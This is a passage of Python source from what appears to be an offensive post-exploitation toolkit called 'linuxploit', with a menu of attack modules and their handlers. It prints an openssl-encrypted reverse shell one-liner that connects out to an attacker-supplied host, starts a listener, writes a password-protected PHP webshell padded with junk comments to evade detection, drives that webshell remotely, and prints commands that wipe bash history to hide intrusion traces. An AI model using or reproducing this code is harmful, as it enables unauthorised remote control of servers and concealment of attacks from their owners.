...
29)         post/clear_track                         command to clear the track in victim machine

[*]SPECIAL REVERSE_SHELL ENCRYPTED:
----------------------------------------------------------------------------------------------------------
S.no:     |         Payload                      |          Description
----------------------------------------------------------------------------------------------------------
...
32)         php_webshell                             A Simple php password protected, encoded cmd webshell
33)         php_webshell_gui                         A simple interactive webshell
34)         webshell_handler                         Handler for simple php webshell which connects and executes commands
...
(From within vi):
	:set shell=/bin/bash:shell
			...
			if os.path.isfile(wordlist):
				...
				wfile=open(wordlist,"r", errors="ignore")
			...
			if os.path.isfile(wordlist):
				...
				print("WORDLIST FILE NOT FOUND!!")
		elif modinput=="29" or modinput=="use 29" or modinput=="use post/clear_track" or modinput=="post/clear_track":
			print("\n echo ls > /home/user/.bash_history && history -c \n echo ls > /root/.bash_history && history -c")
		elif modinput=="30" or modinput=="use 30" or modinput=="use openssl_reverse_tcp" or modinput=="openssl_reverse_tcp":
			lhost=input("FRLf(openssl_reverse_tcp   Enter the LHOST)> ")
			lport=input("FRLf(openssl_reverse_tcp   Enter the LPORT)> ")
			print("\nPayload: \n")			
			print(f"rm /tmp/fr; mkfifo /tmp/fr; cat /tmp/fr |sh -i 2>&1 | openssl s_client -connect {lhost}:{lport} > /tmp/fr \n")
			print(f"YOU MUST USE openssl_listener FOR THIS PAYLOAD or ncat -lp {lport} --ssl")
		elif modinput=="31" or modinput=="use 31" or modinput=="use openssl_listener" or modinput=="openssl_listener":
			lport=input("FRLf(openssl_listener   Enter the LPORT)> ")
			print("LISTENER STARTED ctrl-c to stop")
			os.system(f"./handler -lp {lport} --ssl")
			
		elif modinput=="32" or modinput=="use 32" or modinput=="use php_webshell" or modinput=="php_webshell":
			file=input("FRLf(php_webshell Enter the path/outfile)> ")
			passwd=input("FRLf(webshell_handler Enter the Password for the shell )> ")
			shell=("""
<?php 
/*sdhbfmjhsdfkjhdsbfjhsdfjhsdfjhsdfjhsvdfjhsvdfhgvsdhfgvsdhgfvsdghfvsjhgvshgdvfjhsg
dsjhdvhjsgdvfhgsvjfgsvdfjgvsdhfgvshdgfvhsgdvfjhsgvfhgvfhjsgvfhgsvfhgsvfhgvfjhgvjjgwiyuytfrwqdtvjh cnbx cmgxvyxvc zxc z,nxc xnckyudjjh2iyglyudog873tgsmcn xmn 
mhgvhdvjbiudubsldkjsdsadljbsjdbslkdjsdlksjdnksdnlaskj  jbdbbjskdjgkdjgsjbksahksjdvsadavstdadkjabsdjksadgajdhasbdjhabshdbs bdbakjdkbasjdhbsajdhbasjdbksadja bsadkjbskajbdahjhbsadjhkjshbdaskdasdf  havdavdhsvdsvdkas
svdvahsdvhavsdhasblwquhwbiussbsbkjsbjbdj  sdvvjhjdhjhsd jh dhbdhdhsbdskjb jhvgvjvhvjds dbjhvsdvgvvydtvsnbbsvdgv 
sbdkjhsbdjhsdhvshdvsdhsgdvhsgdhsgdvhsgvdhsds ,dlcdlkfslkknsjnkjdnkjndkjnfkdjfnkjdfkjhbdsfjhbdfbkjhdbkfjbkjdhsbfhsdbfjhskfskdjfjskbfhsjfhsdbkfjhsjfhbsjfhsbjdh

sdfsdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
...
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff */
$passwd=base64_decode($_POST['passwd']);
/*sdhbfmjhsdfkjhdsbfjhsdfjhsdfjhsdfjhsvdfjhsvdfhgvsdhfgvsdhgfvsdghfvsjhgvshgdvfjhsg
dsjhdvhjsgdvfhgsvjfgsvdfjgvsdhfgvshdgfvhsgdvfjhsgvfhgvfhjsgvfhgsvfhgsvfhgvfjhgvjjgwiyuytfrwqdtvjh cnbx cmgxvyxvc zxc z,nxc xnckyudjjh2iyglyudog873tgsmcn xmn 
mhgvhdvjbiudubsldkjsdsadljbsjdbslkdjsdlksjdnksdnlaskj  jbdbbjskdjgkdjgsjbksahksjdvsadavstdadkjabsdjksadgajdhasbdjhabshdbs bdbakjdkbasjdhbsajdhbasjdbksadja bsadkjbskajbdahjhbsadjhkjshbdaskdasdf  havdavdhsvdsvdkas
svdvahsdvhavsdhasblwquhwbiussbsbkjsbjbdj  sdvvjhjdhjhsd jh dhbdhdhsbdskjb jhvgvjvhvjds dbjhvsdvgvvydtvsnbbsvdgv bjhsbkdhbbhsbjhbdjbdsjbdhbsjhsdjhbsuygudsbjshbusdygudbudybsuysdbudsygdsuygdsydgudsysdd
...
?>
			""" %(hashlib.sha512(passwd.encode()).hexdigest()))
			shell_file=open(file,"w+")
			shell_file.write(shell)
			shell_file.close()
			print(f""" 
use webshell_handler to interact with the webshell.
			""")
		elif modinput=="33" or modinput=="use 33" or modinput=="use php_webshell_gui" or modinput=="php_webshell_gui":
...
Open Your Browser and go to -->  http:/<host>:<port>/<upload_path>/{file}
			""")
		elif modinput=="34" or modinput=="use 34" or modinput=="use webshell_handler" or modinput=="webshell_handler":
			url=input("FRLf(webshell_handler Enter the URL/shell_PATH )> ")
			passwd1=input("FRLf(webshell_handler Enter the Password for the shell )> ").encode()
			passwd=hashlib.sha512(passwd1).hexdigest()
			if requests.get(url).status_code == 200:
				cmd=""
				print("CTRL-c to exit shell")
				while True:
					cmd=input(f"linuxploit-webshell>> ").encode()
					req=requests.post(url,data={"cmd":base64.b64encode(cmd),"passwd":base64.b64encode(passwd.encode())})
					if req.text.count("*") >=4:	
						print(req.text)
					else:
						print("Something Wrong: Seems to be its not linuxploit webshell")	
			else:
				print("Specified path or Shell not found in the server!!")
		elif modinput=="35" or modinput=="use 35" or modinput=="use base64_encoder" or modinput=="base64_encoder":
			string=input("FRLf(base64_encoder Enter the String )> ").strip()
			print(base64.b64encode(string.encode()).decode())
		elif modinput=="36" or modinput=="use 36" or modinput=="use base32_encoder" or modinput=="base32_encoder":
			string=input("FRLf(base32_encoder Enter the String )> ").strip()
			print(base64.b32encode(string.encode()).decode())
		elif modinput=="37" or modinput=="use 37" or modinput=="use hex_encoder" or modinput=="hex_encoder":
			string=input("FRLf(hex_encoder Enter the String )> ").strip()
			print(binascii.hexlify(string.encode()).decode())
		elif modinput=="38" or modinput=="use 38" or modinput=="use url_encoder" or modinput=="url_encoder":
			string=input("FRLf(url_encoder Enter the String )> ").strip()
			print(urllib.parse.quote(string))
			
		elif modinput=="39" or modinput=="use 39" or modinput=="use rot13_encoder" or modinput=="rot13_encoder":
			string=input("FRLf(rot13_encoder Enter the String )> ").strip()
			a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUUVWXYZ"
			b="nopqrstuvwxyzabcdefghijklmNOPQRSTUUVWXYZABCDEFGHIJKLM"
			rot13=str.maketrans(a,b)
